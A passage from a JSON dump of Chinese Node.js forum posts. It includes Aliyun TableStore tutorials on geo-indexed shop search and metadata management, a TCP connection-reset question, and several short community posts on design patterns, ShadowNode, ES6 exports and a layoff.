class=\"prettyprint language-bash\"><code>$ npm install tablestore@4.1.0\n</code></pre><h4>C#-SDK</h4>\n<pre class=\"prettyprint language-C#\"><code>$ Install-Package Aliyun.TableStore.SDK -Version 4.1.0\n</code></pre><h2>4、表设计</h2>\n<p>店铺检索系统样例，仅简易使用一张店铺表，主要包含字段：店铺类型、店铺名称、店铺地理位置、店铺平均评分、人均消费消等。表设计如下：\n表名：geo_positon</p>\n<table>\n<thead>\n<tr>\n<th>列名</th>\n<th>数据类型</th>\n<th>索引类型</th>\n<th>字段说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>_id(主键列)</td>\n<td>String</td>\n<td></td>\n<td>MD5(pId)避免热点</td>\n</tr>\n<tr>\n<td>pId</td>\n<td>Stirng</td>\n<td></td>\n<td>店铺编号</td>\n</tr>\n<tr>\n<td>type</td>\n<td>String</td>\n<td>KEYWORD</td>\n<td>类型</td>\n</tr>\n<tr>\n<td>name</td>\n<td>String</td>\n<td>TEXT</td>\n<td>店铺名，TEXT类型索引可模糊查询，但不能排序</td>\n</tr>\n<tr>\n<td>pos</td>\n<td>String</td>\n<td>GEO_POINT</td>\n<td>店铺位置：“30.132,120.082”(纬度,精度)</td>\n</tr>\n<tr>\n<td>point</td>\n<td>double</td>\n<td>DOUBLE</td>\n<td>评分</td>\n</tr>\n<tr>\n<td>…</td>\n<td>…</td>\n<td>…</td>\n<td>…</td>\n</tr>\n</tbody>\n</table>\n<h1>三、开始搭建（核心代码）</h1>\n<h2>1、创建数据表</h2>\n<p>用户仅需在完成邀测的实例下创建“店铺信息表”：通过控制台创建、管理数据表（用户也可以通过SDK直接创建）：</p>\n<p><img src=\"https://cdn.nlark.com/lark/0/2018/png/97467/1542017007370-6da2cc78-0d8a-41a9-8f9a-482cdb258c46.png\" alt=\"image.png | left | 827x351\"></p>\n<h2>2、创建数据表索引</h2>\n<p>TableStore自动做全量、增量的索引数据同步：用户可以通过控制台创建索引、管理索引（也可以通过SDK创建索引）</p>\n<p><img src=\"https://cdn.nlark.com/lark/0/2018/png/97467/1542018711371-dc3ee972-8d9c-4019-95ce-169617e658a7.png\" alt=\"image.png | left | 827x444\"></p>\n<p><img src=\"https://cdn.nlark.com/lark/0/2018/png/97467/1542018817618-e24471c2-3b57-4f12-8e77-44a4458da5ac.png\" alt=\"image.png | left | 827x266\"></p>\n<h2>3、数据导入</h2>\n<p>插入测试数据（控制台样例中插入了1亿条数据，用户自己可以插入少量测试数据）；</p>\n<p><img src=\"https://cdn.nlark.com/lark/0/2018/png/97467/1542030801287-cdeab65b-88ee-4621-8fd6-b28fafb70854.png\" alt=\"image.png | left | 747x156\"></p>\n<table>\n<thead>\n<tr>\n<th>店铺编号</th>\n<th>店铺（md5）（主键）</th>\n<th>类型</th>\n<th>店铺名称</th>\n<th>店铺位置</th>\n<th>店铺评分</th>\n<th>人均消费</th>\n<th></th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>o0057022192</td>\n<td>0000000f470ef0f548b925ceffe1a7e3</td>\n<td>杭帮菜</td>\n<td>韩村杭帮菜</td>\n<td>36.76613,111.41461</td>\n<td>2.87</td>\n<td>63.67</td>\n<td></td>\n<td></td>\n</tr>\n</tbody>\n</table>\n<h2>4、数据读取</h2>\n<p>数据读取分为两类：</p>\n<h3>主键读取</h3>\n<p>基于原生表格存储的主键列获取：getRow, getRange, batchGetRow等。主键读取用于索引（自动）反查，用户也可以提供主键（订单md5）的单条查询的页面，亿量级下查询速度极快。单主键查询方式不支持多维度检索；</p>\n<h3>索引读取（店铺查询）</h3>\n<p>基于新SearchIndex功能Query：search接口。用户可以自由设计索引字段的多维度条件组合查询。通过设置选择不同的查询参数，构建不同的查询条件、不同排序方式；目前支持：精确查询、范围查询、前缀查询、匹配查询、通配符查询、短语匹配查询、分词字符串查询，并通过布尔与、或组合。\n如【&quot;36.76613,111.41461&quot;周边1km米范围内的奶茶店】，查询条件如下：\n####Node.js代码</p>\n<pre class=\"prettyprint language-node\"><code>client.search({\n    tableName: TABLE_NAME,\n    indexName: INDEX_NAME,\n    searchQuery: {\n        offset: 0,\n        limit: 10, \n        query: {\n            queryType: TableStore.QueryType.BOOL_QUERY,\n            query: {\n                mustQueries: [ \n                    { &#x2F;&#x2F;查询条件一：TermQuery，cId这一列的值要匹配&quot;c0001&quot;\n                        queryType: TableStore.QueryType.TERM_QUERY,\n                        query: {\n                            fieldName: &quot;type&quot;,\n                            term: &quot;奶茶&quot;\n                        }\n                    },\n                    { &#x2F;&#x2F;查询条件二：RangeQuery，totalPrice这一列的值要大于99.99\n\t\t\t            queryType: TableStore.QueryType.GEO_DISTANCE_QUERY,\n\t\t\t            query: {\n\t\t\t                fieldName: &quot;pos&quot;,\n\t\t\t                centerPoint: &quot;36.76613,111.41461&quot;, &#x2F;&#x2F; 设置中心点(纬度,经度)\n\t\t\t                distance: 10000 &#x2F;&#x2F; 设置到中心点的距离条件，不超过10000米\n\t\t\t            }\n                    },\n                ],\n            }\n        },\n        getTotalCount: true\n    },\n    columnToGet: {\n        returnType: TableStore.ColumnReturnType.RETURN_ALL\n    }\n}, callback);\n</code></pre><p>####Java代码：</p>\n<pre class=\"prettyprint language-java\"><code>List&lt;Query&gt; mustQueries = new ArrayList&lt;Query&gt;();\n\nTermQuery termQuery = new TermQuery();\ntermQuery.setFieldName(&quot;type&quot;);\ntermQuery.setTerm(ColumnValue.fromString(奶茶));\nmustQueries.add(termQuery);\n\nGeoDistanceQuery geoDistanceQuery = new GeoDistanceQuery();\ngeoDistanceQuery.setFieldName(&quot;pos&quot;);\ngeoDistanceQuery.setCenterPoint(&quot;36.76613,111.41461&quot;);\ngeoDistanceQuery.setDistanceInMeter(1000);\nmustQueries.add(geoDistanceQuery);\n\nBoolQuery boolQuery = new BoolQuery();\nboolQuery.setMustQueries(mustQueries);\n</code></pre><h1>四、欢迎加入</h1>\n<p>文章引自: <a href=\"https://yq.aliyun.com/articles/668084\">https://yq.aliyun.com/articles/668084</a>\n这样，系统的核心代码已经完成，基于表格存储搭亿量级“店铺搜索系统”，是不是很简单？\n对表格存储（TableStore）感兴趣的用户，欢迎加入【表格存储公开交流群】，群号：11789671。</p>\n<p><img src=\"//static.cnodejs.org/Fqdl_sEtHlHsPGSHNlEcvJyj3pKk\" alt=\"panda.png\"></p>\n</div>","title":"TableStore实战：GEO索引打造亿量级店铺搜索系统","last_reply_at":"2019-01-23T08:46:30.757Z","good":false,"top":false,"reply_count":2,"visit_count":701,"create_at":"2019-01-14T11:53:03.077Z","author":{"loginname":"wangtantan","avatar_url":"https://avatars1.githubusercontent.com/u/16631445?v=4&s=120"}},{"id":"5c4145db3898674067a806ae","author_id":"58130d10b37ee8fb339788cf","tab":"share","content":"<div class=\"markdown-text\"><h1>一、方案背景</h1>\n<p>用户存储海量的文档、媒体文件等数据的同时，对文件元数据（Mate）的管理不可或缺。元数据拥有多维度的字段信息，基本信息包含文件大小、创建时间、用户等。随着人工智能的发展，通过AI技术提取文件核心要素也成为文件元数据的重要信息。以图片为例：用户通过智能媒体服务，获取分析图片核心标签并为标签打分，用户还可提取人脸识别相关信息，以及地理位置等信息，提取的信息也需要存储到文件元数据信息中。因而文件元数据的信息量不断增加，格式、类型也不断呈现多元化。</p>\n<h2>需求场景</h2>\n<p>某智能媒体管理平台，为用户提供文件（图片、视频等）管理服务，用户通过自研（或售卖）的智能媒体分析工具，为目标文件进行分析。用分析后的信息丰富原有的元数据信息。因此，平台需要一套有效的元数据管理方案，为用户提供元数据信息的管理、分析、统计功能。例如：\n用户A：【用户A的文件】*【近1年】*【标签含[开心]】*的所有图片，按标签分数排序\n用户B：【用户B的文件】*【出现某某明星】*的所有视频，按明星相似度排序\n…\n管理系统样例，如下所示：<strong>官网控制台地址：</strong><a href=\"https://ots.console.aliyun.com/index#/demo/cn-hangzhou/meta\">项目样例</a></p>\n<p><img src=\"https://cdn.nlark.com/lark/0/2018/gif/97467/1543390748397-a6ac2284-800b-4f16-bded-95372d912d50.gif\" alt=\"immDemo.gif | center | 827x490\"></p>\n<h2>技术点</h2>\n<p>对于智能元数据管理系统，通常需要考虑的技术点，包含以下方面：</p>\n<ul>\n<li>查询能力：具备强大的查询能力，如多类型索引、多维度组合查询等，同时具备排序、统计等功能；</li>\n<li>横向扩展（多字段）：元数据的字段类型丰富，字段变动、增删频繁，数据库尽量schema free来保证横向扩展能力；</li>\n<li>纵向扩展（数据量）：海量文件就会对应海量元数据，面对数据膨胀，数据库要满足易扩展、低成本等基本要求；</li>\n<li>服务性能：应对高并发请的同时，保证低延迟、强一致、高可用；\n<img src=\"https://yqfile.alicdn.com/0521389bcd0500a5f086cdda841013263f97f9a6.png\" alt=\"20190107103121\"></li>\n</ul>\n<h1>二、表格存储（TableStore）方案</h1>\n<p>使用表格存储（TableStore）研发的多元索引（SearchIndex）方案，可以有效解决海量元数据的管理问题。TableStore具有即开即用，按量收费等特点。\nTableStore作为阿里云提供的一款全托管、分布式NoSql型数据存储服务，具有【海量数据存储】、【热点数据自动分片】、【海量数据多维检索】等功能，天然地解决了数据大爆炸这一挑战；在应对数据横向、纵向扩展上，充分发乎其优势。多元索引随时创建，是Meta元数据管理的合适方案。\n同时，SearchIndex功能在保证用户数据高可用的基础上，提供了数据多维度搜索、统计等能力。针对多种场景创建多种索引，实现多种模式的检索。用户可以仅在需要的时候创建、开通索引。由TableStore来保证数据同步的一致性，这极大的降低了用户的方案设计、服务运维、代码开发等工作量。</p>\n<h3>基于表格存储搭建的智能元数据管理系统页面一览</h3>\n<p>样例内嵌在表格存储控制台中，用户可登录控制台体验系统（若为表格存储的新用户，需要点击开通服务后体验，开通免费，Meta数据存储在公共实例中，体验不消耗用户存储、流量、Cu）。\n<strong>注：该样例提供了【亿量级】文件元数据。官网控制台地址：</strong><a href=\"https://ots.console.aliyun.com/index#/demo/cn-hangzhou/meta\">项目样例</a></p>\n<p><img src=\"https://cdn.nlark.com/lark/0/2018/png/97467/1543394791423-2144bfea-86f5-45e4-a0bf-e90d7900d44a.png\" alt=\"image.png | left | 827x465\"></p>\n<p><img src=\"https://cdn.nlark.com/lark/0/2018/png/97467/1543394681928-d2a8d25a-8046-445e-934d-9a6dc40ec9ee.png\" alt=\"image.png | left | 827x465\"></p>\n<h1>二、搭建准备</h1>\n<p>若您对于智能元数据管理系统感兴趣，希望开始自己系统的搭建之旅，只需按照如下步骤便可以着手搭建了：</p>\n<h2>1、开通表格存储</h2>\n<p>通过控制台开通表格存储服务，表格存储即开即用（后付费），采用按量付费方式，已为用户提供足够功能测试的免费额度。<a href=\"https://ots.console.aliyun.com/\">表格存储官网控制台</a>、<a href=\"https://help.aliyun.com/document_detail/52733.html\">免费额度说明</a>。</p>\n<h2>2、创建实例</h2>\n<p>通过控制台创建表格存储实例，选择支持多元索引的Region。（当前阶段SearchIndex功能尚未商业化，暂时开放北京，上海，杭州和深圳四地，其余地区将逐渐开放）</p>\n<p><img src=\"https://cdn.nlark.com/lark/0/2018/png/97467/1539915875520-18e33218-3d60-4b3a-8ff9-05ced52aab73.png\" alt=\"image | left\"></p>\n<p>创建实例后，提交工单申请多元索引功能邀测（商业化后默认打开，不使用不收费）。</p>\n<ul>\n<li>邀测地址：<a href=\"https://workorder.console.aliyun.com/console.htm#/ticket/add?productCode=ots&amp;commonQuestionId=1402&amp;isSmart=true\">提工单</a>，选择【表格存储】&gt;【产品功能、特性咨询】&gt;【创建工单】，申请内容如下：</li>\n<li>问题描述:请填写【申请SearchIndex邀测】</li>\n<li>机密信息:请填写【地域+实例名】，例：上海+myInstanceName</li>\n</ul>\n<p><img src=\"https://cdn.nlark.com/lark/0/2018/png/97467/1539915294761-f6527b3e-3a87-47a8-a5ee-abe07cae3fc1.png\" alt=\"image | left\"></p>\n<h2>3、SDK下载</h2>\n<p>使用具有多元索引（SearchIndex）的SDK，<a href=\"https://help.aliyun.com/document_detail/86528.html\">官网地址</a>，暂时java、go、node.js三种SDK增加了新功能</p>\n<h4>java-SDK</h4>\n<pre class=\"prettyprint language-xml\"><code>&lt;dependency&gt;\n    &lt;groupId&gt;com.aliyun.openservices&lt;&#x2F;groupId&gt;\n    &lt;artifactId&gt;tablestore&lt;&#x2F;artifactId&gt;\n    &lt;version&gt;4.8.0&lt;&#x2F;version&gt;\n&lt;&#x2F;dependency&gt;\n</code></pre><h4>go-SDK</h4>\n<pre class=\"prettyprint language-bash\"><code>$ go get github.com&#x2F;aliyun&#x2F;aliyun-tablestore-go-sdk\n</code></pre><h4>Nodejs-SDK</h4>\n<pre class=\"prettyprint language-bash\"><code>$ npm install tablestore@4.1.0\n</code></pre><h4>C#</h4>\n<pre class=\"prettyprint language-cmd\"><code>$ Install-Package Aliyun.TableStore.SDK -Version 4.1.0\n</code></pre><h2>4、表设计</h2>\n<p>表名：order_contract</p>\n<table>\n<thead>\n<tr>\n<th>列名</th>\n<th>数据类型</th>\n<th>索引类型</th>\n<th>字段说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>_id(主键列)</td>\n<td>String</td>\n<td></td>\n<td>MD5(oId)避免热点</td>\n</tr>\n<tr>\n<td>fId</td>\n<td>String</td>\n<td>KEYWORD</td>\n<td>文件编号</td>\n</tr>\n<tr>\n<td>userId</td>\n<td>String</td>\n<td>KEYWORD</td>\n<td>用户编号</td>\n</tr>\n<tr>\n<td>tags</td>\n<td>String</td>\n<td>Nested: [{tag: String,score: LONG}]</td>\n<td>多标签使用嵌套索引（数组字符串） ‘[{“tag”:“表格存储”,“score”:97.317251}，{“score”:50.770918,“tag”:“沙漠”}]’</td>\n</tr>\n<tr>\n<td>size</td>\n<td>long</td>\n<td>LONG</td>\n<td>文件大小</td>\n</tr>\n<tr>\n<td>createdAt</td>\n<td>long</td>\n<td>LONG</td>\n<td>创建时间（时间戳）</td>\n</tr>\n<tr>\n<td>url</td>\n<td>String</td>\n<td>KEYWORD</td>\n<td>文件链接（存储于oss）</td>\n</tr>\n<tr>\n<td>…</td>\n<td>…</td>\n<td>…</td>\n<td>…</td>\n</tr>\n</tbody>\n</table>\n<h1>三、开始搭建（核心代码）</h1>\n<h2>1、创建数据表</h2>\n<p>创建智能元数据表，用户仅需维护一个实例，按如下方式在实例下建表：\n通过控制台创建、管理数据表（用户也可以通过SDK直接创建）：</p>\n<p><img src=\"https://cdn.nlark.com/lark/0/2018/png/97467/1543396765128-247cf311-2234-4da3-afec-e6331447cba4.png\" alt=\"image.png | left | 827x323\"></p>\n<p>2、创建数据表索引\nTableStore自动做全量、增量的索引数据同步：用户可以通过控制台创建、管理SearchIndex（用户也可通过SDK创建）：</p>\n<p><img src=\"https://cdn.nlark.com/lark/0/2018/png/97467/1543397031614-f638059b-b201-4197-989d-5938c269f87d.png\" alt=\"image.png | left | 827x371\"></p>\n<h2>3、数据导入</h2>\n<p>插入部分测试数据（控制台样例中插入了1亿条数据，用户自己可以通过控制台插入少量测试数据）；</p>\n<table>\n<thead>\n<tr>\n<th>文件编号</th>\n<th>文件ID（md5主键）</th>\n<th>用户编号</th>\n<th>标签（数组字符串）</th>\n<th>类型</th>\n<th>链接</th>\n<th>大小</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>f052535742</td>\n<td>1bce…</td>\n<td>u05254</td>\n<td>[{“score”:99.999999,“tag”:“表格存储”},{“score”:78.962224,“tag”:“冰雹”},{“score”:18.328385,“tag”:“开心”},{“score”:16.886812,“tag”:“雪山”}]</td>\n<td>“image”</td>\n<td><a href=\"https://prd-console-demo.oss-cn-hangzhou.aliyuncs.com/image/imm19.jpg\">'https://prd-console-demo.oss-cn-hangzhou.aliyuncs.com/image/imm1.jpg</a></td>\n<td>9022066</td>\n</tr>\n</tbody>\n</table>\n<h2>4、数据读取</h2>\n<p>数据读取分为两类：</p>\n<h3>主键读取</h3>\n<p>基于原生表格存储的主键列获取：getRow, getRange, batchGetRow等。主键读取用于索引（自动）反查，用户也可以提供主键（文件编号md5）的单条查询的页面，亿量级下查询速度保持在十毫秒量级。单主键查询方式不支持多维度检索；</p>\n<h3>索引读取</h3>\n<p>基于新SearchIndex功能Query：search接口。用户可以自由设计索引字段的多维度条件组合查询。通过设置选择不同的查询参数，构建不同的查询条件、不同排序方式；目前支持：精确查询、范围查询、前缀查询、匹配查询、通配符查询、短语匹配查询、分词字符串查询、嵌套查询、GEO查询，并通过布尔与、或组合。\n如【标签为：表格存储，创建时间[2018-01-01, 2018-12-01)】文件的信息：（SDK与控制查询）</p>\n<h4>Node.js代码</h4>\n<pre class=\"prettyprint language-node\"><code>client.search({\n    tableName: TABLE_NAME,\n    indexName: INDEX_NAME,\n    searchQuery: {\n        offset: 0,\n        limit: 10, \n        query: {\n            queryType: TableStore.QueryType.BOOL_QUERY,\n            query: {\n                mustQueries: [ \n                    { &#x2F;&#x2F;查询条件一：NesterdQuery，嵌套字段检索，标签为“表格存储”\n                        queryType: TableStore.QueryType.NESTED_QUERY,\n                        query: {\n                            path: &quot;tags&quot;,\n                            query: {\n                                queryType: TableStore.QueryType.TERM_QUERY,\n                                query: {\n                                    fieldName: &quot;tags.tag&quot;,\n                                    term: &quot;表格存储&quot;\n                                }\n                            },\n                        }\n                    },\n                    { &#x2F;&#x2F;查询条件二：RangeQuery，创建时间大于1514793600000\n                        queryType: TableStore.QueryType.RANGE_QUERY,\n                        query: {\n                            fieldName: &quot;createdAt&quot;,\n                            rangeFrom: 1514793600000,\n                        }\n                    },\n                    { &#x2F;&#x2F;查询条件三：TermQuery，文件类型为图片&quot;image&quot;\n                        queryType: TableStore.QueryType.TERM_QUERY,\n                        query: {\n                            fieldName: &quot;type&quot;,\n                            term: &quot;image&quot;\n                        }\n                    }\n                ],\n            }\n        },\n        getTotalCount: true\n    },\n    columnToGet: {\n        returnType: TableStore.ColumnReturnType.RETURN_ALL\n    }\n}, callback);\n</code></pre><h4>Java代码</h4>\n<pre class=\"prettyprint language-java\"><code>List&lt;Query&gt; mustQueries = new ArrayList&lt;Query&gt;();\n\n&#x2F;&#x2F;嵌套字段Query\nTermQuery termQuery = new TermQuery();\ntermQuery.setFieldName(&quot;tags.tag&quot;);\ntermQuery.setTerm(ColumnValue.fromString(&quot;表格存储&quot;));\n\nNestedQuery nestedQuery = new NestedQuery();\nnestedQuery.setPath(&quot;tags&quot;);\nnestedQuery.setScoreMode(ScoreMode.Avg);\nnestedQuery.setQuery(termQuery);\nmustQueries.add(nestedQuery);\n\n&#x2F;&#x2F;范围Query\nRangeQuery rangeQuery = new RangeQuery();\nrangeQuery.setFieldName(&quot;createdAt&quot;);\nrangeQuery.setFrom(ColumnValue.fromLong(1514793600000, true);\nrangeQuery.setTo(ColumnValue.fromLong(1543651200000, false);\nmustQueries.add(rangeQuery);\n\n&#x2F;&#x2F;精确Query\nTermQuery termQuery = new TermQuery();\ntermQuery.setFieldName(&quot;type&quot;);\ntermQuery.setTerm(ColumnValue.fromString(&quot;image&quot;));\nmustQueries.add(termQuery);\n\nBoolQuery boolQuery = new BoolQuery();\nboolQuery.setMustQueries(mustQueries);\n</code></pre><p><img src=\"https://cdn.nlark.com/lark/0/2018/png/97467/1543405965925-28f34de4-92ed-4fa1-92b2-84c6c107964e.png\" alt=\"image.png | left | 747x394\"></p>\n<h1>四、欢迎加入</h1>\n<p>__引自云栖：原文地址：<a href=\"https://yq.aliyun.com/articles/673797?channel=cnode\">https://yq.aliyun.com/articles/673797</a></p>\n<p>这样，系统的核心代码已经完成，基于表格存储搭建智能元数据管理系统，是不是很简单？\n对表格存储（TableStore）感兴趣的用户，欢迎加入【表格存储公开交流群】，群号：11789671。</p>\n<p><img src=\"//static.cnodejs.org/Fqdl_sEtHlHsPGSHNlEcvJyj3pKk\" alt=\"panda.png\"></p>\n</div>","title":"TableStore实战：智能元数据管理方案","last_reply_at":"2019-01-23T08:44:21.180Z","good":false,"top":false,"reply_count":2,"visit_count":795,"create_at":"2019-01-18T03:19:55.800Z","author":{"loginname":"wangtantan","avatar_url":"https://avatars1.githubusercontent.com/u/16631445?v=4&s=120"}},{"id":"5c3ede35a4d44449266b19cc","author_id":"5c3edd903898674067a7fd39","tab":"ask","content":"<div class=\"markdown-text\"><p>TCP客户端代码：\nconst net = require(‘net’);\nfor(let i=0; i&lt;100; i++){\nlet client = net.Socket();\nclient.connect(8430,‘localhost’);\nclient.write(<code>你好，我是机器人${i}号</code>);\n// client.on(“connect”,()=&gt;{\n//     console.log(“已成功连接上服务器！”);\n// })\n}\nTCP服务器代码：\nconst net = require(‘net’);\n<a href=\"//1.xn--TCP-p18doh57t70ab5tppnrjh12xpm6h\">//1.创建一个TCP服务器对象</a>\nconst server = net.createServer();\n<a href=\"//2.xn--jhq54iw1akir2hl8ahdp48l5w3ajvi\">//2.服务器监听地址与端口</a>\nserver.listen(8430,‘localhost’,1);\n<a href=\"//3.xn--listening-td7nz0bbmi50bw8dxht5bx9bzxrx1dfj604yf9ek19h1wuavq9f\">//3.服务器监听端口和地址时会触发listening事件</a>\nserver.on(“listening”,()=&gt;{\n<a href=\"//3.1\">//3.1</a> server.listenting用于判断服务器是否正在监听端口\n<a href=\"//3.2\">//3.2</a> 获取服务器监听的地址和端口信息\nlet info = server.address();\nif( server.listening ){\nconsole.log(<code>正在监听${info.address}:${info.port}</code>);\n}\n})\n<a href=\"//4.xn--79qspf5alirq65gdvbxd912fxuppzc385esglmj3g\">//4.当服务器监听端口和地址出错时</a>，触发error事件\nserver.on(“error”,err=&gt;{\nconsole.log(<code>服务器抛出一个错误：${err.code}</code>);\n})</p>\n<p><a href=\"//5.xn--connection-oo3pe4bpy1a9mfe3jp4xo76b0k9ctvve\">//5.服务器对象监听connection事件</a>，当有客户端连接该服务器时触发该事件。\nserver.on(“connection”,(socket)=&gt;{\nsocket.on(“data”,data=&gt;{\nconsole.log(data.toString());\n})\n<a href=\"//5.xn--1-e38an3vu4g92efunj0wt57a\">//5.1取消客户端超时</a>\n// socket.setTimeout(0);\n<a href=\"//6.xn--zfru1gjyc8squ9br6csc190wrfxa5ej\">//6.设置服务器最大连接数</a>，拒绝多余的连接\nserver.maxConnections = 10000;\nconsole.log(<code>服务器能接收的最大并发连接数：${server.maxConnections}</code>);\n<a href=\"//7.xn--ldru0bna599hs5ay9o2ndq51ge4wa\">//7.获取当前并发连接数</a>\nserver.getConnections(((err,count)=&gt;{\nconsole.log(<code>当前并发连接数：${count}</code>);\n}));\n})</p>\n<p><a href=\"//8.xn--eyq28c54el4ra91voyaw3fftoq51az05d\">//8.停止服务器接收新的连接</a>，保持已存在的连接，当所有连接关闭时，服务器将会关闭，将会触发close事件\nsetTimeout(() =&gt; {\nserver.close();\n}, 1000*60);</p>\n<p><a href=\"//9.xn--server-9y2l.xn--close-n60kyn276b8hsyh6c\">//9.当server.close方法调用时</a>，会触发close事件\nserver.on(“close”,()=&gt;{\nconsole.log(“服务器已经停止接受新的连接！”);\n<a href=\"//10.xn--unref-xf6h22bb3qyxtob161ogw2bxjnkq6e\">//10.服务器退出应用程序unref</a>\nserver.unref()\n<a href=\"//11.xn--ref-q00e07eu2a15dp5hz6vob061ol2lfyg903afiqr16f\">//11.取消服务器停止退出应用程序ref</a>\nlet isOver = false;\nif(!isOver){\nserver.ref();\n}\n});</p>\n</div>","title":"100个左右TCP客户端去访问同一个TCP服务器，报错connect ECONNRESET 127.0.0.1:8430是什么原因呢","last_reply_at":"2019-01-23T05:51:46.376Z","good":false,"top":false,"reply_count":1,"visit_count":769,"create_at":"2019-01-16T07:33:09.530Z","author":{"loginname":"wzpxx","avatar_url":"https://avatars2.githubusercontent.com/u/8017327?v=4&s=120"}},{"id":"5c46d41e6955112b99437ad9","author_id":"5b03c9a7000332b81cf821a5","tab":"share","content":"<div class=\"markdown-text\"><p>总纲（开闭原则），细则（设计六大原则），招式（二十三种基础设计模式）</p>\n</div>","title":"设计模式的设计原则好像武学","last_reply_at":"2019-01-23T01:47:24.682Z","good":false,"top":false,"reply_count":2,"visit_count":967,"create_at":"2019-01-22T08:28:14.722Z","author":{"loginname":"linxiaoziruo","avatar_url":"https://avatars3.githubusercontent.com/u/6881273?v=4&s=120"}},{"id":"5a68d49fafa0a121784a8f48","author_id":"52c005d28a716e0b1578f9cc","tab":"share","content":"<div class=\"markdown-text\"><p>好久不见，Yorkie 最近做了一个小东西，在此分享给大家！</p>\n<p>先放个链接：<a href=\"https://github.com/Rokid/shadow-node\">https://github.com/Rokid/shadow-node</a>\n从名字来看，他可不是一个 Node.js 的 C++ Addon，而是可以运行 Node.js 程序的另一个运行时（Runtime），相比 Node.js，具有更快的启动速度以及更小的内存占用、更加节省内存的模块加载方式！原来一个 Node.js 应用需要好几十M的运行时内存，现在可能只需要几兆就可以搞定了，并且拥有更快的启动速度。这也是因为 ShadowNode 不再使用 v8 作为 JavaScript 引擎，而是使用一款三星出品的 JerryScript 在做底层的解释执行！</p>\n<p>ShadowNode 目前支持的模块还比较有限，不过一些基础的如 HTTP/NET/DNS/Child Process 等都是支持的，并且除此之外，还默认支持 DBus 通讯方式，对于像 Linux 平台，简直是不要太方便，另外，对于硬件玩家，如果有兴趣移植到自己的开发板上的，也支持了诸如 I2C/ADC/GPIO 等这样的硬件接口，也就是说接入硬件仅仅写写脚本就能把你的硬件玩起来！另外，也可以把他移植到你家里的任意设备上，作为脚本语言使用，也是不错的选择！</p>\n<p>在此，我对 ShadowNode 寄予着非常大的希望，目前 Node.js 在嵌入式设备来说，无可避免都是内存占用的大户，之前 Tessel 曾经尝试把 JavaScript代码编译成 Lua 来达到降低内存的目的，也有一些不同的开发板使用像 JerryScript 这样低内存的引擎／虚拟机，然后仅仅支持了部分简单的模块以及 CommonJS，而我完全希望 ShadowNode 将更完全地支持 Node.js/Npm 模块，能够让 JavaScript 开发者能无缝在 Node.js 与 ShadowNode 中切换，尽量少地减少学习的成本！另外，ShadowNode 底层使用纯 C 编写，我们将大部分代码交给 C 来实现，JavaScript 仅仅作为胶水层语言！</p>\n<p>最后，搭车招个人！坐标杭州西溪，Rokid 公司，招募嵌入式、服务端以及社区增长黑客，共同点都是要热爱 JavaScript 以及 Node.js，简历的话直接去我 GitHub 邮件我就好了～</p>\n</div>","title":"ShadowNode: 以更轻量级的方式使用 Node.js","last_reply_at":"2019-01-23T00:19:07.624Z","good":true,"top":false,"reply_count":38,"visit_count":7812,"create_at":"2018-01-24T18:46:55.269Z","author":{"loginname":"yorkie","avatar_url":"https://avatars3.githubusercontent.com/u/1935767?v=4&s=120"}},{"id":"5c45836e3b948a2b4ab7019d","author_id":"5a466a64f320ae9f0dd581c4","tab":"ask","content":"<div class=\"markdown-text\"><p><img src=\"//static.cnodejs.org/FmHBshd6S20jYp7tTp9YSMQA35wK\" alt=\"Untitled.jpg\">\n今天在写axios 接口的时候，一个同事说用export ，这样性能会好一些，看了阮一峰的文档这么写，但是又无法论证，请教下大佬</p>\n</div>","title":"es6 中 export default 和 export 性能有区别？","last_reply_at":"2019-01-22T14:01:49.443Z","good":false,"top":false,"reply_count":6,"visit_count":928,"create_at":"2019-01-21T08:31:42.904Z","author":{"loginname":"ChrisChenSZ","avatar_url":"https://avatars0.githubusercontent.com/u/17292590?v=4&s=120"}},{"id":"5c41de623b948a2b4ab6f6b9","author_id":"5bf3cec8e6481c5709f5d871","tab":"ask","content":"<div class=\"markdown-text\"><p><strong>第一次裁员被裁员的时候，我妈问你有没有被裁，让我好好工作，我说你儿子这么优秀不会啦。\n今天被裁员的时候，我妈让我买好来回的车票，年后别请假。我都不知道怎么回复。公司业绩不好裁员我理解，但是这个时候刚开完年会，\n你认为合适么。你年会讲的那些形而上学的积极正能量的话呢！哎。。。。。。</strong></p>\n<p><strong>既然已经发生，命运无法改变，只能正确面对！趁着休息的这段时间，沉淀，学习。</strong></p>\n<p><strong><a href=\"https://github.com/tzbcf/myblog-vue.cli-3.0-node-ts\">博客项目</a>求点赞。</strong></p>\n<p><strong>如果有好的工作机会，求推荐！前端（两年半）、node后端（一年）、全栈.下面是我微信二维码</strong></p>\n<p><img src=\"https://www.terrorblade.xyz/img/wxfd.png\" alt=\"微信\"></p>\n</div>","title":"下午三点半通知我被裁员，下午6点前就得交接完，第一次看见公司效率这么高","last_reply_at":"2019-01-22T08:07:20.925Z","good":false,"top":false,"reply_count":19,"visit_count":2696,"create_at":"2019-01-18T14:10:42.251Z","author":{"loginname":"tzbcf","avatar_url":"https://avatars1.githubusercontent.com/u/25059314?v=4&s=120"}},{"id":"5c03517d887c5864fafe19d1","author_id":"5b5a7729b71aedfe4c12652b","tab":"share","content":"<div class=\"markdown-text\"><p><strong>总结了8点：</strong>\n1、使用JavaScript运行于服务端的平台上，自然继承了JavaScript语言的一些特性；\n2、Node.js基于单线程、基于非阻塞I/O模型实现；\n3、适合于数据密集型应用，不适用于计算密集型类的应用（如算法等）；\n4、通过使用回调函数，来避免同步地等待I/O操作完成；\n5、Node.js非核心模块非常多，质量可能参差不齐（使用别人贡献的模块，要有承担风险的准备）；\n6、因为简单，开发Node.js应用程序效率很高；\n7、调试相对困难，调试工具可能没有其他一些比较成熟的语言（如Java、C++等）的好用；\n8、Node.js基于事件驱动架构，events模块是Node.js最核心的模块。\n最后给大家推荐系列node.js视频教程：<a href=\"http://www.sucaihuo.com/video/224-0-0\">http://www.sucaihuo.com/video/224-0-0</a></p>\n</div>","title":"想学习node.js需要什么基础知识？","last_reply_at":"2019-01-21T15:02:23.494Z","good":false,"top":false,"reply_count":3,"visit_count":1244,"create_at":"2018-12-02T03:29:01.324Z","author":{"loginname":"codeofking","avatar_url":"https://avatars2.githubusercontent.com/u/41748064?v=4&s=120"}},{"id":"5c4548543b948a2b4ab6ff0e","author_id":"5a7a5d505321b5396004ec1e","tab":"share","content":"<div class=\"markdown-text\"><p><img 